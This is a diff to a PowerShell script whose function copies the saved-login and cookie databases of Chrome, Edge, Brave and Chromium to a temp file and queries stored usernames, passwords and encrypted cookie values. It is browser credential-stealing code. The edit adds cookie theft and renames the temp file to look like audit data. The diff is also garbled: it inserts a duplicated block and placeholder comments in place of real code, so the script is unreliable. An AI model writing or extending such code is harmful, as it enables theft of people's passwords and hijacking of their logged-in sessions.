@@ -615,32 +615,64 @@ function Decrypt-ChromeKeyBlob {
 }
 
 function Get-ChromiumLoginBlobs {
-    param([string]$Browser)
+    param(
+        [string]$Browser,
+        [switch]$Cookies # Added this switch to handle cookies
+    )
+
+    # Determine which file to target based on the switch
+    $TargetFile = if ($Cookies) { "Default\Network\Cookies" } else { "Default\Login Data" }
 
     switch ($Browser.ToLower()) {
-        "cft"       { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome for Testing\User Data\Default\Login Data"     }
-        "chrome"    { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\Default\Login Data"                        }
-        "edge"      { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Default\Login Data"                }
-        "brave"     { $LoginDataPath = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\Default\Login Data"   }
-        "chromium"  { $LoginDataPath = Join-Path $env:LOCALAPPDATA "Chromium\User Data\Default\Login Data"                      }
-        default     { return "`n[-] Unsupported browser name: $Browser" }
+        "cft"      { $DataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome for Testing\User Data\$TargetFile" }
+        "chrome"   { $DataPath = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data\$TargetFile" }
+        "edge"     { $DataPath = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\$TargetFile" }
+        "brave"    { $DataPath = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data\$TargetFile" }
+        "chromium" { $DataPath = Join-Path $env:LOCALAPPDATA "Chromium\User Data\$TargetFile" }
+        default    { return "`n[-] Unsupported browser name: $Browser" }
     }
 
-    if (-not (Test-Path -Path $LoginDataPath)) {
-        return $false
-    }
+    if (-not (Test-Path -Path $DataPath)) { return $false }
 
-    [int]$SqliteOk              = 0
-    [int]$SqliteRow             = 100
-    [int]$SqliteOpenReadOnly    = 1
-    $TempDatabasePath           = Join-Path $env:TEMP ("$($Browser)_LoginData_{0}.db" -f ([guid]::NewGuid()))
+    [int]$SqliteOk = 0
+    [int]$SqliteRow = 100
+    [int]$SqliteOpenReadOnly = 1
+    $TempDatabasePath = Join-Path $env:TEMP ("$($Browser)_AuditData_{0}.db" -f ([guid]::NewGuid()))
 
     try {
-        Copy-Item -LiteralPath $LoginDataPath -Destination $TempDatabasePath -Force -ErrorAction Stop
+        Copy-Item -LiteralPath $DataPath -Destination $TempDatabasePath -Force -ErrorAction Stop
     }
     catch {
-        return "[-] Unable to copy database file from $LoginDataPath"
+        return "[-] Unable to copy database file from $DataPath"
     }
+
+    $DatabasePointer = [IntPtr]::Zero
+    $StatementPointer = [IntPtr]::Zero
+
+    # NEW LOGIC: Switch the SQL query based on the task
+    if ($Cookies) {
+        $SqlQuery = 'SELECT host_key, host_key, name, encrypted_value FROM cookies'
+    } else {
+        $SqlQuery = 'SELECT signon_realm, origin_url, username_value, password_value FROM logins'
+    }
+
+    $ResultCode = $Sqlite3OpenV2.Invoke($TempDatabasePath, [ref]$DatabasePointer, $SqliteOpenReadOnly, [IntPtr]::Zero)
+    
+    # ... [The rest of the function code below this remains the same] ...
+
+    $DatabasePointer = [IntPtr]::Zero
+    $StatementPointer = [IntPtr]::Zero
+
+    # NEW LOGIC: Switch the SQL query based on the task
+    if ($Cookies) {
+        $SqlQuery = 'SELECT host_key, host_key, name, encrypted_value FROM cookies'
+    } else {
+        $SqlQuery = 'SELECT signon_realm, origin_url, username_value, password_value FROM logins'
+    }
+
+    $ResultCode = $Sqlite3OpenV2.Invoke($TempDatabasePath, [ref]$DatabasePointer, $SqliteOpenReadOnly, [IntPtr]::Zero)
+    
+    # ... [The rest of the function code below this remains the same] ...
 
     $DatabasePointer    = [IntPtr]::Zero
     $StatementPointer   = [IntPtr]::Zero
